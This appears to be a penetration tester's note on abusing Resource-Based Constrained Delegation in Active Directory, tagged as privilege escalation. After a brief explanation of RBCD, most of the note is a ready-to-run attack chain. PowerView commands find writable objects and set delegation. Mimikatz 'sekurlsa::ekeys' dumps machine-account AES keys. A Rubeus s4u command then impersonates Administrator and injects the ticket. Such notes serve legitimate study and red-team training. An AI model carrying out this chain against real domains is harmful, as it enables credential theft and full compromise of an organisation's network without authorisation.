---
tags:
  - privesc
title:
  - RBCD
---
![[Kerberos_Delegation.svg]]
- Resource Based [[constrained_delegation]]
- This moves delegation authority to the resource/service administrator
- Instead of SPNs on `msDs-AllowedToDelegateTo` on the front-end service like the web service in this example, access in this case is controlled by security descriptor of `msDS-AllowedToActOnBehalfOfOtherIdentity` (visible as `PrincipalsAllowedToDelegateToAccount`) on the resource/service.
- That is, the resource/service administrator can configure this delegation whereas for other types, SeEnableDelegation privileges are required which are, by default, available only to Domain Admins.
- The security descriptor on the second hop can determine who can access it, not the first hop.

To abuse RBCD in the most effective form, we just need two privileges
1. Write permissions over the target service or object to configure msDs-AllowedtoActOnBehalfOfOtherIdentity
2. Control over an object which has SPN configured (like admin access to a domain joined machine or ability to join a machine to domain - ms-DS-machineQuota is 10 for all domain users)

```powershell title:"Enumeration that shows users with Write permissions"
Find-InterestingDomainACL | ?{$_.identityreferencename -match 'username'}
```

```powershell title:"Check for RBCD"
Get-DomainRBCD
```

```powershell title:"Configure RBCD on a machine for users (PowerView)"
Set-DomainRBCD -Identity computer-name -DelegateFrom your-foothold
```

```powershell title:"Configure RBCD on a machine for users (ActiveDirectory Module)"
$machine_accounts = 'pwned-machine-account1$', 'pwned-machine-account2$'
Set-ADComputer -Identity computer-name -PrincipalsAllowedToDelegateToAccount $machine_accounts
```

```powershell title:"Get the privileges of the machine accounts by extracting its AES keys"
Invoke-MimiKatz -Command '"sekurlsa::ekeys"'
```

```batch title:"Use the AES key of the machine account(s) and access computer-name with ANY user we want"
Rubeus.exe s4u /user:machine-account1$ /aes256:<aes256_key> /msdsspn:service/computer-name /impersonateuser:Administrator /ptt
```



